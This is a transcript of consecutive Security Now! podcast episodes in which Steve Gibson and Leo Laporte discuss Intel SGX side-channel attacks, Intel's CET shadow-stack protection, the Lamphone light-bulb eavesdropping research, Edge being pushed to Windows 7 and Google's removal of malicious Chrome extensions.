And of course these new attacks aren't the first to soften the SGX security wall.  We've talked about several before.  Back in 2018 a different team of researchers used the attack, now known as Meltdown.  And still another team broke SGX in a different way earlier this year.  So things are not looking good for Intel security at the moment.  And as we know, we talked about it at the time, Intel mitigated the earlier SGX vulnerabilities by introducing updates to their microcode.  But they were insufficient.



So Intel has again, last week, released yet again new updates which should be available to end users before long.  As we know, Intel's microcode can be patched at boot time, and either the motherboard's startup code or our OS's boot is able to apply those patches on the fly.  So eventually we'll get them.  I imagine Linux will have them quickly.  Microsoft will push them into current versions of Windows.  No longer supported versions of Windows will never get them.  And maybe motherboard BIOSes will get them for those motherboards which are still being maintained.  So yet another problem.



The most recent attacks are known as SGAxe and CrossTalk.  Both use new and different side-channel attacks to infer what's going on within this walled-off region of Intel's processors.  I've got more stuff in the show notes, but everyone gets the ideas now.  That's all bad news.



I do have some good news from Intel.  Control-flow enforcement technology, which we're going to be talking about in the future, CET, control-flow enforcement technology is finally here.  Intel just announced that its long-awaited hardware control-flow enforcement technology is ready and will be included first in their next Tiger Lake mobile CPUs.  And they did also say that desktop and server platforms based on the Tiger Lake architecture would be getting them.



I talked about CET a while back.  Recall that it's the technology that maintains a completely separate shadow hardware stack which, unlike the processor's traditional hybrid stack which mixes together subroutine return addresses with subroutine calling parameters and dynamically allocated data and buffers, the CET stack only contains the control-flow data, namely subroutine returns, and also indirect branch data.



Since this data is maintained by the hardware and is not visible in any way to software, unlike the software-visible stack, it's not subject to malicious manipulation.  So when any return-from-subroutine instruction is encountered, this new Intel hardware will compare the return address it previously stored in its hardware to the return address that is being executed on the software stack.  And if they're not in agreement, the executing thread will be killed.



This is a massive win for Intel processor security because in one fell swoop it eliminates a broad class of attacks.  I mean, this is not just we're trying to protect our processors from information leakage.  This is overt antimalware technology.  And all of those surprisingly effective Return-Oriented Programming, those ROP attacks that the previous randomization of operating system, kernel, and program address space - remember ASLR and KASLR - they were attempting to mitigate these return-oriented programming attacks by randomizing where things were so that attackers who were blind to where things were loaded wouldn't be able to as easily craft return-oriented programming attacks which had otherwise proven so effective.



Since ASLR can only place software modules in a finite and relatively small number of places, like one of 256 places, we've seen that some attackers are fine with just guessing and crashing if they're wrong because some percentage of the time, like around 4% in the case of a one-in-256 chance, they will succeed.  And when it's a numbers game, like in an attack that's just being sprayed out, that might be good enough for them.  But in the presence of a hardware shadow stack, those attacks all fail, once and for all.



So I'm really excited about this, thanks to the fact that Intel has been working on this for the past four years, since 2016, when they first published their CET specification.  And as we know, Intel has a relatively long processor development cycle.  They've got a bunch of processors in the pipeline.  And so it's taken four years for new architecture that incorporated CET in the microarchitecture to make it like to the point where it's ready to ship.



But the other good news is, since it took four years, and since Intel was able to give everybody a heads-up, software publishers have had time to get ready and add the required support to their code, waiting for the day when this next-generation active antimalware technology would finally ship.  It's already present in the GNU standard C library, Glibc.  And Microsoft has also added CET support to Windows Insiders, calling their support for this feature Hardware-Enforced Stack Protection.



So once we actually have the chips, the apps and operating systems will be able to enable their support and opt into the truly significant protection that CET provides.  And as I noted, CET will first appear in Intel's Tiger Lake architecture mobile chips, apparently like now, and then it will also be available for desktop and server platforms.



So Leo, I think this is cool.  This is like basically we've had no other hardware enforcement of these problems.  We've had things like, remember, like stack canaries, where little tokens would be placed on a stack, and the subroutine return would check for the canary before it would accept it.  And since bad guys, that was like something bad guys wouldn't be able to put on the stack necessarily, although, yeah, canaries have been bypassed, too.  All the other things that have been done have been software-based solutions.  Here we have a hardware-based solution that just ends this.



Now, of course, it does require that it be turned on.  It requires that the hardware be able to support it.  So unfortunately it's not applicable at all for any of the pre-Tiger Lake hardware.  Thus it's going to take some time for this to filter into all of the hardware that we have, and then for everything just to be able to assume it's there, like we do now with things like math coprocessors that we didn't used to have.  But still, this is nice.  It means basically that address space layout randomization and kernel address space layout randomization, when CET is present and can be enabled, could be turned off if there was any cost or overhead for doing it because this is like the right way to end that kind of abuse, and anything else that goes wrong.  So very, very cool.



LEO:  Neat.  All right, Steve.  Now we will find out about...



STEVE:  As I said at the top of the show, I was originally going to title this week's podcast "Newly Vulnerable," since we talked about a bunch of new vulnerabilities.



LEO:  Yeah.



STEVE:  And then put them all at the end.  And I was going to place the Lamphone under "This Week in Wacky Surveillance Technology" category.  But as they always do, the researchers have a quite serious 15-page research paper, which always hooks me.  And their work will be presented at Black Hat in August, the virtual Black Hat conference.  So I decided that it won the top spot for this week's title and topic.  And no one will be surprised to learn that this research hails from the Ben-Gurion University of the Negev, and the Weizmann Institute of Science, which produces a steady stream of new and imaginative data exfiltration schemes.  Remember the singing capacitors of our power supplies.  That was from those guys, too.



And what makes their work stand out is that they always wrestle every wacko scheme to the ground, applying solid science and physics to the challenge.  In the show notes I have a schematic of their attack, which in the left-hand frame shows a couple of people talking, and that creating sound vibrations in the air, which apparently causes some microvibrations in the surface of a light bulb, like hanging from the - just a regular light bulb hanging from the ceiling.  Then in their experiment up to I think it was 27 yards - maybe it was more than that.  We'll get to it in a second.  I mean, at some good distance away, they were able to use a telescope looking at the light bulb and a photodiode-based sensor to detect the microvibrations that the light bulb was subjected to just from regular conversation in the room.



Now, the light bulb, of course, is far from being a high-quality microphone.  It's anything but.  But they were able to work out the details.  So this time I'm going to skip the abstract of their paper, which I normally share.  Instead, I'm going to share their introduction, since this really does, it turns out, represent an advance in the state of the art of eavesdropping attacks, thanks to the backend computational transform that's needed to convert a light bulb's highly nonlinear frequency response into reconstructed speech.



If you think about a tuning fork, as we all know, you thwack it, and it vibrates at its natural resonance frequency.  So in terms of speech, it's an extremely sharp band-pass, a very narrow band-pass filter.  And a light bulb is not much better.  So think about like a wine glass.  You can ting the side; right?  And if it's crystal, it'll vibrate, again at its natural resonance frequency.  So rather than directly obtaining the speech waveform, what you get is more of a speech frequency modulated amplitude modulation.  So they had to do some work in order to extract speech.



So anyway, they explain this.  They said:  "Introduction.  Eavesdropping, the act of secretly or stealthily listening to a target or victim without his or her consent by analyzing the side effects of sound waves on nearby objects, for example, a bag of chips" - remember we talked about that years ago.  You're looking at the vibration of a bag of chips, and we're able to extract the speech from it - "and devices, motion sensors, for example.  It's considered a great threat to privacy."



They said:  "In the past five years, various studies have demonstrated novel side-channel attacks that can be applied to eavesdrop via compromised devices planted in physical proximity of a target or victim.  In these studies, data from devices that are not intended to serve as microphones - for example, motion sensors, speakers, vibration devices, and magnetic hard disk drives - are used by attackers to recover sound.



"Sound eavesdropping, based on the methods suggested in the abovementioned studies is very hard to detect because applications and programs that implement such methods do not require any risky permissions, such as obtaining data from a video camera or a microphone.  As a result, such applications do not raise any suspicion from the user or operating system regarding their real use, eavesdropping.  However, such methods require the eavesdropper to compromise a device located in proximity to the target victim in order to obtain data that can be used to recover sound and exfiltrate the raw processed data."



They said:  "To prevent eavesdroppers from implementing any of the above-mentioned methods which rely on compromised devices, organizations deploy various mechanisms to secure their networks.  For example, air-gapping the networks, prohibiting the use of vulnerable devices in sensitive areas, using firewalls and intrusion detection systems to prevent exfiltration.  As a result, eavesdroppers typically utilize three well-known methods that don't rely on a compromised device.



"The first method exploits radio signals sent from a victim's room to recover sound.  This is done using a network interface card that captures WiFi packets sent from a WiFi router, placed in physical proximity of a target or victim.  While routers exist in most organizations today, the primary disadvantages of these methods is that they cannot be used to recover speech, or they rely on a previously collected dictionary to achieve their goal."  In other words, it only works from previously known words.



And we talked about this, sort of something related, a long time ago, how reflected WiFi signals could be used to detect a person's motion or movements within a room.  And apparently a group of researchers managed to detect the much smaller movements of the mouths of people speaking via WiFi signals, and then map them back into what they must be saying.  Needless to say, it was strictly a proof of concept and would hardly be practical.



Anyway, our guys continue, saying:  "The second method, a laser microphone, relies on a laser transceiver that is used to direct a laser beam into the victim's room through a window.  The beam is reflected off of an object" - or maybe the window itself - "and returned to the laser transceiver, which converts the audio-modulated beam into an audio signal.  In contrast to the previous limited radio-based methods, laser microphones can be used in real time to recover speech.  However, the laser beam can be detected using a dedicated optical sensor.



"The third method, the Visual Microphone, exploits vibrations caused by sound from various materials - a bag of chips, a glass of water."  I think we talked about balloons once.  You could have, like, you know, inflated balloons in a room, and the balloon would vibrate, it being relatively elastic and pretty easy to pick up sounds.  They said:  "...in order to recover speech by using a video camera that supports a very high frame rate per second, high FPS of over 2200 Hz.  In contrast to the laser microphone, the Visual Microphone is passive, so its implementation is much more difficult for organizations and victims to detect."



However, the main disadvantage of this method, according to the authors, is that the Visual Microphone cannot be applied in real time because it takes a few hours to recover a few seconds of speech, since processing the high resolution and high frequency 2200-frames-per-second video requires significant computational resources.  In addition, the hardware required, a very high frame-per-second video camera, is expensive.



So, they said:  "In this paper we introduce 'Lamphone,' a novel side-channel attack that can be applied by eavesdroppers to recover sound from a room that contains an exposed hanging light bulb.  Lamphone recovers sound optically via an electro-optical sensor which is directed at a hanging bulb.  Such bulbs vibrate due to air pressure fluctuations which occur naturally when sound waves hit the hanging bulb's surface.  We explain how a bulb's response to sound, a millidegree vibration" - actually I think it ended up being microdegree vibration - "can be exploited to recover sound, and we establish a criterion for the sensitivity specifications required of a system capable of recovering sound from such small vibrations."



I was actually thinking I should have called this "Good Vibrations" or "Bad Vibrations" or something.  But anyway, speaking of which, Leo, did you ever see the - this is completely off topic.  But I sent a note out to my friends.  Did you ever see "Yesterday" when it was in the theatres?  The movie?



LEO:  Oh, yeah.  I loved it, too.



STEVE:  Okay, because it's available on Netflix, and Lorrie and I rewatched it on Friday.



LEO:  That's the one where the Beatles never existed, yeah.  And [Jack] has a bike accident and somehow enters a different dimension where the Beatles never existed, but he remembers all the Beatles songs.  So he becomes a massively successful songwriter. 



STEVE:  Yeah.  Very cool.  So for what it's worth, completely just out of the blue.



LEO:  Yeah, what does that have to do with this?



STEVE:  Nothing.  Not at all.  Except I was talking about "Good Vibrations."  But that's...



LEO:  But that's the Beach Boys.



STEVE:  That's the Beach Boys, not the Beatles.



LEO:  I get your logic.  I can - you enjoyed it, yeah, it's a good movie.  I really liked it.



STEVE:  I really did.  And speaking of which, since I'm off topic, it turns out, remember "Devs," the show that we loved?



LEO:  Yeah?



STEVE:  The eight-episode series on Amazon?



LEO:  Yeah.



STEVE:  The co-producer is a Security Now! podcast listener.  The reason "Devs" was as accurate as it was is because of this podcast.



LEO:  No.  Because remember, I recommended it to you because in the first 15 minutes there's a debate over elliptic curve cryptography versus RSA.  And I thought, gee, that's pretty good.



STEVE:  From the podcast.



LEO:  Son of a gun.



STEVE:  And in fact, when some of the actors wanted some help in getting a sense for what techie talk sounds like...



LEO:  No.



STEVE:  He said:  "Listen to a couple episodes of Security Now!."



LEO:  Oh, man.  So when they bring that back - I don't know if they can.  I guess they're kind of done.



STEVE:  The loop is complete.  Oh, it was fabulous.  If anyone, you know, it was on Amazon Prime, and absolutely top recommendations.  So anyway, I thought that was very cool.



LEO:  That's wonderful, yeah.  Nice.



STEVE:  Anyway, so they determine the criterion for the sensitivity specifications of a system capable of recovering sound from such small vibrations.  They said:  "Then we evaluate a bulb's response to sound, identify factors that influence the recovered signal" - like I said, these guys go all the way - "and characterize the recovered signal's behavior.  We then present an algorithm we developed in order to isolate the audio signal from an optical signal obtained by directing an electro-optical sensor at a hanging bulb.  We evaluate Lamphone's performance on the tasks of recovering speech and songs in a realistic setup.  We show that Lamphone can be used by eavesdroppers to recover human speech which can be accurately identified by Google Cloud Speech API."



Which I suppose means that it would be possible to set up an entirely automated listening station which triggers human involvement only when specific keywords were voiced because Google's Cloud Speech API could be doing speech recognition on the fly, turning it into text, looking for keywords, and then letting someone know.



LEO:  Unbelievable.



STEVE:  And they also said singing, which can be accurately identified by Shazam and SoundHound...



LEO:  [Laughing]



STEVE:  Oh, yeah, from a bridge located 25 meters, 27 yards away from the target office containing the hanging light bulb.



LEO:  Wow.



STEVE:  They said:  "We discuss potential improvements that can be made to Lamphone to optimize the results and extend Lamphone's effective sound recovery range.  Finally, we discuss countermeasures that can be employed by organizations to make it more difficult for eavesdroppers to successfully use this attack vector."



So I was unsure how much time we would have, but we do have a little bit more, so I'll share a little bit, just so our listeners can get a sense for what they did.  In Section 4 of the paper, bulbs as microphones.  They said:  "We measure the vibration of a hanging bulb, and we establish a criterion for the sensitivity specifications for a system capable of recovering sound from these vibrations.



"Experimental setup:  We attach a gyroscope, the MPU-6050GY-5216" - for anyone who wants to duplicate - "to the bottom of a hanging E27 LED light bulb (12 watts).  That bulb was not illuminated during this experiment.  A Raspberry Pi 3 was used to sample the gyroscope at 800 Hz.  We placed Logitech Z533 speakers very close to the hanging bulb, one centimeter away, and played various sine waves at 100, 150, 200, 250, 300, 350, and 400 Hz from the speakers at three volume levels - 70, 95, and 115 dB.  We obtained measurements from the gyroscope while the sine waves were played.



"Results:  Based on the measurements obtained from the gyroscope, we calculated the average peak-to-peak difference in degrees for theta and phi.  The average peak-to-peak difference was computed by calculating the peak-to-peak difference between every 800 consecutive measurements, that were collected from one second of sampling, and averaging the results.  The frequency response was a function of the average peak-to-peak difference, revealing three interesting insights.



"The average peak-to-peak difference for the angle of the bulb is, one, very small, 0.005" - okay, so it is milli - "to 0.06 degrees."  So that's between 5 and 60 millidegrees.  "Two, increases as the volume increases."  Okay, not surprisingly.  "And, three, changes as a function of frequency."  Which you would expect, right, because it's not, I mean, it is far from being a neutral frequency response.  You don't buy your light bulbs based on, oh, has a flat frequency response within 3 dB.  No.



LEO:  I might start.



STEVE:  "Based on the known formula of the spherical coordinate system, we calculated the 3D vector," they say, "x,y,z, that represents the peak-to-peak vibration on each of the three axes by taking the distance between the ceiling and the bottom of the hanging bulb into account.  We calculated the Euclidean distance between this vector and the vector of the initial position.  The results show that sound affected the hanging bulb, causing it to vibrate in 300 to 950 microns between the range of 100 and 400 Hz."



Then, under "Capturing the Optical Changes:  We now explain how attackers can determine sensitivity of the equipment - an electro-optical sensor, a telescope, and an A to D converter - needed to recover sound based on a bulb's vibration.  We've established the criterion for recovering sound.  The attacker's system - consisting of an electro-optical sensor, a telescope, and an analog to digital converter - must be sensitive enough to capture the small optical differences that are the result of a hanging bulb that moves in 300 to 950 microns.  In order to demonstrate how eavesdroppers can determine the sensitivity of the equipment they will need to satisfy the above criterion, we conduct another experiment.



"Experimental Setup:  We directed a telescope at a hanging 12 watt E27 LED bulb."  And as I said, I have a diagram at the top of the show notes.  "We mounted an electro-optical sensor, the Thorlabs PDA100A2, which is an amplified switchable gain light sensor that consists of a photodiode" - which you need for frequency response, a photo transistor is not fast enough, says he who did the light pen for the Apple II - "used to convert light to electrical voltage, to the telescope.  The voltage was obtained from the electro-optical sensor using a 16-bit A to D converter, the NI-9223 card, and was processed in LabVIEW script that we wrote," they said.  "The internal gain of the electro-optical sensor was set at 50 dB.  We placed the telescope at various distances - 100, 200, 300, 420, 670, 830, and 950 centimeters - from the hanging bulb and measured the voltage that was obtained from the electro-optical sensor at each distance.



"The results of this experiment were used to compute the linear equation between each two consecutive points.  Based on the linear equations, we calculated the expected voltage at 300 microns and 950 microns of bulb displacement.  From this data we can determine which frequencies can be recovered from the obtained optical measurements.  A 16-bit A to D with an input range of from minus 10 to positive 10 volts, for example the NI-9223 card used in our experiments, provides a sensitivity of 300 microvolts, provided by a 16-bit A to D converter, which is sufficient for recovering the entire spectrum from 100 to 400 Hz in the 200 to 300 centimeter distance range, because the smallest vibration of the bulb, 300 microns, from this range is expected to yield a difference of 300 microvolts.  However, this setup cannot be used to recover the entire spectrum in the 670 to 830 centimeter range, so an A to D converter that provides a higher sensitivity is required."



And anyway, they go on like that, and you get the sense.  It is now possible, they ended up verifying, after they'd calibrated everything and figured out what equipment they needed, they did do the 27-yard experiment with a light bulb and people talking in the room.  It is now the case that anybody talking in a room which is visible to the outside can be overheard if there's something in the room that is vibrating because we now have the technology to look at it and recover the speech in the room from that.  So congrats to the guys at the Ben-Gurion University and the Weizmann Institute of Science.  And I wonder who else might be reading their paper with interest?



LEO:  Oh, come on, Steve.  The NSA's had this for years.  You know they have.



STEVE:  That's true.  That's true.  This is not news for them.



LEO:  I mean, you could even speculate this would be possible.  So I'm sure they thought of this way back when.  It's cool, though.  It's cool research, and not surprising at all, yeah.  I'm sure plate glass windows vibrate.  It's just a question of whether you can measure such a small vibration; you know?



STEVE:  Yeah.  With that, you know, we know that a laser interferometer will do that.



LEO:  Sure.



STEVE:  So you can bounce a laser.  But then you're going to see a red spot on the window.



LEO:  Right, right.



STEVE:  And so what's cool about this is that they want to take a totally passive approach.  Nothing in the room, no listening devices, just find something that's vibrating.  And my goodness, you know, think about it.



LEO:  Everything vibrates.



STEVE:  Yes, exactly.



LEO:  Right.



STEVE:  So, I mean, and a light bulb is relatively rigid.  So it's going to be resistant to vibration compared to, like, a leaf on a plant, a plant in a flowerpot or something.  So they tackled the tough one.



LEO:  I hope they got an "A," that's all I can say.



STEVE:  Somebody is now "Dr." who wasn't before.



LEO:  Doctor, you ought to be the doctor.  Steve Gibson, he is at GRC.com, the Gibson Research Corporation.  That's where he makes SpinRite, the world's finest hard drive recovery and maintenance utility, currently working hard on 6.1.



STEVE:  I'll have an announcement next week.  I'll have some code for our listeners to play with.



LEO:  See, now, if you buy 6 right now, you'll get a free upgrade to 6.1, but you'll also be involved in the beta testing of it.  So I think this would be...



STEVE:  Yes, sir.



LEO:  Head over to GRC.com.  While you're there, lots of free stuff to test out, including ShieldsUP! and, oh, it's just a beautiful nest of fun facts to fill your mind.  And of course this show is there.  He has 16Kb audio, 64Kb audio.  He's got transcripts so you can read along as you listen, or use them for searching.  That's really a great tool there because you can search for a phrase or a term or a name, and it'll jump right to that part of the podcast.  All of that's at GRC.com.



We don't have anything so fancy, but we do have video, so you can watch Steve, if you really want.  That's at TWiT.tv/sn.  We do the show Wednesdays right after MacBreak - sorry, Tuesdays.  We only changed this years ago, just it's not sinking in.  Tuesdays, 1:30 Pacific, that's 4:30 Eastern time, 20:30 UTC.



If you want to listen live or watch live, go to TWiT.tv/live.  There's streams there.  Chat with the chat room while you're listening, irc.twit.tv.  Get on-demand versions at the website, TWiT.tv/sn for Security Now!.  And let's see, I guess the one more thing to say is subscribe.  That way you'll get it automatically.  You can start building your collection of 771 Security Now! episodes.  Very cool.



I love that "Devs" story.  That blows me away.  That is awesome.  It makes perfect sense in hindsight, but that's just great.  Steve, have a wonderful week.  Stay safe.  And I will see you next Tuesday on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#772

DATE:		June 23, 2020

TITLE:		Ripple20

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-772.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at Microsoft's interesting decision to update Windows 7 desktops with their new Edge browser, Google's wholesale removal of 106 widely downloaded malicious Chrome extensions, Microsoft's continuing drama over Win10 printing, a potentially critical remote code execution vulnerability in everyone's favorite VLC media player, an interesting move by Roskomnadzor, Netgear's residence in the doghouse, a new and startling record in DDoS attack size, a bit of errata, and the anticipated announcement of a new piece of spin-off freeware from the SpinRite project.  Then we examine the ripple effects of the mass adoption of an embedded TCP/IP stack that is found to be horribly insecure many years after it has been quite widely adopted across the embedded device industry.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with lots of security tales of woe including 106 malicious Google Chrome extensions, the truth about Zoom end-to-end encryption, and then we'll talk about two massive flaws - one in more than 70 Netgear routers, the other in pretty much every IoT and embedded network device anywhere.  And there's not much of a fix.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 772, recorded Tuesday, June 23rd, 2020:  Ripple20.



It's time for Security Now!, the show where we cover you with privacy, we wrap you up in security, we pat you on the head, and we put you to bed.  And it's all done...



STEVE GIBSON:  And send you out trembling.



LEO:  Trembling, yeah, actually that's more like it.  There he is, the man of the hour, Steve Gibson of GRC.com.  Hi, Steve.



STEVE:  Leo, great to be with you again.  We have a rip-roaring show.  It's titled for this Security Now! 772 "Ripple20," which - ah, boy.  This speaks to why we really don't want to have a technological monoculture.  But lots of news.  We're going to look at Microsoft's interesting decision to once again update Windows 7, but not with what you would expect, not security, but with the Edge browser.



We're going to look at Google's wholesale removal of 106 widely downloaded malicious Chrome extensions and what brought that to their attention.  Microsoft's continuing drama over Windows 10 printing not resolved yet, folks.  A potentially critical remote code execution vulnerability in everyone's favorite VLC media player.  An interesting move by, wait for it, Roskomnadzor, of course Russia's media watchdog.



LEO:  We're going to really have to get a Russian to pronounce that for us so we know how that goes.



STEVE:  Yeah, maybe.  Although I'm having too much fun with it as it is.  We also have Netgear taking up residence in the doghouse.  Oh, goodness.  Also a new and startling record has been broken in DDoS attack size.  We've also got a bit of errata as a consequence of you and I discussing how long we've been doing the show last week.  That created quite a kerfuffle over in GRC's SpinRite newsgroup, or Security Now! newsgroup.



We're going to - oh, I also have the anticipated announcement of a new piece of spinoff freeware from the SpinRite project.  And then, time remaining - actually, no, we'll have time - we're going to examine the ripple effects, thus the name Ripple20, of the mass adoption of an embedded TCP/IP stack that is found now, 23 years since its birth, to be horribly insecure and quite widely adopted across the embedded device industry.



LEO:  Huh.



STEVE:  Yeah.  And we do have sort of a unique Picture of the Week for those who are curious.



LEO:  Yes.  I can't wait to show everybody. 



STEVE:  So anyway, you were talking on Sunday on TWiT about your blog, and you showed everybody a picture of yourself, I'm not sure at what...



LEO:  In high school.



STEVE:  Oh, in high school.



LEO:  In high school, yeah.



STEVE:  So as it happened, one of my gang, my high school gang that I've referred to a couple times, we've maintained a connection to each other, and we're in a group text.  I was listening to you guys talking on MacBreak Weekly about group texting.  I thought, yeah, I'm in a couple groups.



LEO:  Nice.



STEVE:  Anyway, Jim - who was my best friend at the latter half of high school, and so when we both got into Berkeley, we requested each other as roommates, and he became my roommate - is in the process of digitizing his vast paper printed photo collection back from the Eastman Kodak days.  And he ran across some that he had taken in 1973 and shot them to me.  Anyway, so since this happened a couple weeks ago, I thought, oh, I have a picture.  Anyway, so for what it's worth, I mean, it's not going to be of interest to most people, but...



LEO:  Oh, it's of great interest.  Are you kidding?  This is you in college?  Are you a freshman?  What year are you?



STEVE:  I was a freshman.



LEO:  As all freshmen do, you had stolen a street sign.  I think that's good.



STEVE:  I had my, yes, my required street sign, and posters on the wall.



LEO:  Posters, yeah.



STEVE:  And I love the out-of-focus in the foreground coffee pot.



LEO:  Coffee pot, we know where that started.  



STEVE:  And I still remember that particular coffee pot.  That was a very important item in my life at the time.



LEO:  Oh, that's great.  I love it.



STEVE:  And there is, in the upper left, you can sort of barely - I know what it is because I remember it.  But I was messing around with plotters and the Xerox graphics printer.  And so there are some vestiges of things from SAIL, Stanford's AI Lab at the time.  And, you know, just crazy stuff.  And then there's that cranky woman whose picture is covering up the sign.



LEO:  We've all seen that.



STEVE:  I don't remember whether I took it or Jim took it.  But I was messing with black-and-white and Ilford film at the time.



LEO:  That's funny.  So it's your picture, huh?



STEVE:  And so I might have just, I mean, that was an actual woman in Berkeley who was really not happy to have her picture taken.



LEO:  That's hysterical.  That's hysterical.



STEVE:  By some random kid.  But she was just such a grouch, I put her on the, you know, I thought, well, I'll make an enlargement and have fun with that.  So anyway...



LEO:  You also have the requisite "Danger" sign.  Everybody should have that.  I mean, this is good.  This is good.  I love this.  This is so classic.  I know this era.  What was it, '71, '72, thereabouts, somewhere like that?



STEVE:  Yeah, it was 1973 is when I graduated from high school.  So it would have been toward the end of '73 that I was a freshman at Berkeley.



LEO:  Wow.  Thank you, Steve.  You made my day.



STEVE:  Anyway, just a little blast from the past.



LEO:  It is awesome.



STEVE:  And I haven't changed a bit since then.



LEO:  A bit.  You know what, you were actually a little chubbier then; you know?  You've leaned out a little bit.



STEVE:  Yeah, I had a little bit of meat on me back in those days.



LEO:  Yeah.  But that moustache, that's the same one. 



STEVE:  And like the sideburns, Leo?  They come right down and wrap around underneath my jaw line there.



LEO:  Yeah, love them, love them.  Very impressive.  I had your hair, too.  I had that exact hair.  It's so funny.



STEVE:  Everybody did back then.



LEO:  It's so cute.



STEVE:  Now none of us do.



LEO:  Right.



STEVE:  So starting last Wednesday, the 17th, our long-dormant Windows 7 Update suddenly sprang back to life as Microsoft began rolling out an "important," is what it was labeled, update for their long-since-forgotten Win7 64-bit systems.  It's 4567409, titled "Microsoft Edge Update for Windows 7."



LEO:  Oh.  Oh.  Oh.



STEVE:  I know.  It's like, what?  "For x64-based systems."  And of course that's their new Chromium-based Edge web browser.  The bulletin states that this update is not being offered to enterprise devices, only to users running Windows 7 SP1 and Win8.1 Home, Professional, Ultimate, Starter, or Core editions.  And they wrote:  "This update is not intended to target Enterprise devices.  Specifically, this update targets devices that run Windows 7 SP1 or later versions and Windows 8.1 or later versions that are either Home, Professional, Ultimate, Starter, or Core.  Devices that run these editions on Active Directory or Azure Active Directory domain are also excluded from this automatic update."  So in other words, all the rest of us.



They said it's only available via Windows Update and not being offered as a standalone download from the Microsoft Update Catalog, as opposed to, as we'll see in a minute here, some things that I wish were being offered by Windows Update, but aren't.  And they said:  "After being installed, the following changes will be made." And this, again, this is unsolicited; right?  "Edge will be pinned to the taskbar and add a shortcut to the desktop.  If the current version of Edge, if any, already has a shortcut, it will be replaced.  The new Edge will not replace IE, and this update will not change the system's default URL handler."



So that's nice.  It's not like suddenly it pops up when you click a link, if you've got Chrome or Firefox on Windows 7.  But still, it's interesting; you know?  It suggests that Microsoft would like to have a bit of a foothold in all of those non-enterprise machines that are still stubbornly running Windows 7.  And I was curious like what that meant.  The latest market share has Windows 10 solidly in - that is, market share of the desktop - Windows 10 solidly in first place at 53.74%.  Windows 7 is in solid second place at 28.35.  But after that, so Windows 10 at nearly 54%.  Windows 7 at about 28%.  Then it's a drop to third place for macOS X v10.14 at, get this, 3.84%.  Then Windows 8.1 at 3.65.



So together the pair of Windows 10 and Windows 7 total 82% of all desktops.  So it's still going strong.  And I guess I can see why Microsoft might not be willing to concede the desktop browser to Chrome when it no doubt feels that it now, finally, has something, thanks to Chromium, of course, that's every bit as good.  But anyway, it's just kind of weird that, yeah, we're not going to fix any security problems you have; but we think you should have the Edge browser on Windows 7 just because.  It's like, okay.



LEO:  Wow.



STEVE:  Yeah, isn't that weird?



LEO:  Of all things to update.  That's so weird.



STEVE:  I know.



LEO:  You know, I had a call this weekend on the radio show by a guy who said that happened.  And I was skeptical.  I thought, no, why would Microsoft do that?  It makes no sense.



STEVE:  Doesn't that sound completely random?  It's like, what?



LEO:  Yeah, well, they were.



STEVE:  Yeah.  And I did already because of the podcast.  I already had Edge on my Win7 machine that I'm sitting in front of right now.  And so I didn't notice any change.  I did go into it to see if it said anything about update pending or a new version or something.  But I didn't catch anything.  But anyway, I thought that was just sort of curious.  And certainly there are, what is it, about one third, no, half as many Windows 7 now as Windows 10.  So it's beginning to ebb.  And you would expect that, now that security updates have once and for all finally really truly been terminated.  So, yeah, it's pushed people over to Windows 10.  And I'm sort of making a fragile peace with it.



I tried to install Windows 10 over the weekend on an old x86 machine, the very end of the work that I was doing on this new InitDisk utility.  Somebody managed to get it to pop up a complaint about the floppy drive not being ready on one of his systems.  And I was unable to make it happen.  And then he explained, oh, no, you have to have a diskette controller on a motherboard with no disk drive, no floppy drive plugged into the controller.  If it's plugged into the controller, no problem.  But if it's a floppy controller that doesn't have a floppy drive on it - anyway, to make a long story short, I fixed that.  It no longer does that.  But in order to verify it, I had to install Windows 7 on an old machine that still had a floppy controller.  Turns out that they're kind of rare now.  I mean, it's easy to plug in a USB floppy drive, and most BIOSes know how to support that.



LEO:  Those are pretty rare, too.  I'm amazed you could find one. 



STEVE:  Yeah, they are.  But then I wanted to try Windows 10 because I figured, well, while I'm at it, I might as well be able to boot this old x86 machine into 7 or 10.  It kept refusing to take a Windows 10 install.  Finally, I cloned the x86 Windows 7 install to another drive.  Then I used that installer updater thing, I can't remember the exact name for it, which runs on x86.  It came up under Windows 7, said hi, would you want to update to Windows 10?  And I said, yes, because nothing else, it works.



So it downloaded what it needed to and churned away for a while and rebooted a few times and finally said, this Pentium 4 doesn't support NX.  Windows 10 will not run.  So it's like, oh, that's interesting.  So that's of course the no-execute bit, which was added later to the Pentium 4 than my chip, apparently.  And so no go.  So anyway, I'm happy with Windows 7 on that.  And I'll be talking about InitDisk a little bit later.  And I have no idea how I got off onto this.



LEO:  Well, but just to be clear, you need to do this because of SpinRite.  You've got to have all this legacy stuff lying around; right?



STEVE:  Exactly.  That's precisely why.  Yeah.  And the technology that I'll be talking about later is a spinoff of SpinRite because I needed an absolutely bulletproof - well, I'll talk about it in a minute.  Later.  We've got lots of other stuff to talk about.



LEO:  Yes.



STEVE:  Google yanked 106 out of 111 - apparently five somehow they didn't agree with - malicious Chrome extensions which were found to be collecting sensitive user data.  The well-named cybersecurity firm, Awake Security, because that's the way you want your cybersecurity firms, identified the extensions as malicious in a report they published last Thursday which they titled "The Internet's New Arms Dealers:  Malicious Domain Registrars."  And of course you and I, how many times have we talked about the danger of DNS registrars doing the wrong thing?  You know, domain name registrars issuing certs that they shouldn't.



In this case, they explained that their report dives into the results of their multi-month investigation that uncovered a massive global surveillance campaign affecting millions of users, like 33 million.  The campaign involved thousands of domains and more than 100 malicious Chrome extensions with all the activity tying back to a single Internet domain registrar, GAL (G-A-L) Communication.  And they have in here, they have CommuniGal (C-O-M-M-U-N-I) Ltd., also known as GalComm.  They said:  "This campaign and the Chrome extensions included operations such as taking screenshots of the victim device, loading malware, reading the clipboard, and actively harvesting tokens and user input.  In the wake of Awake's disclosure, Google has taken down the malicious extensions" - all but five.  "However, the campaign was able to avoid detection by using state-of-the-art security tools through a number of evasion schemes."



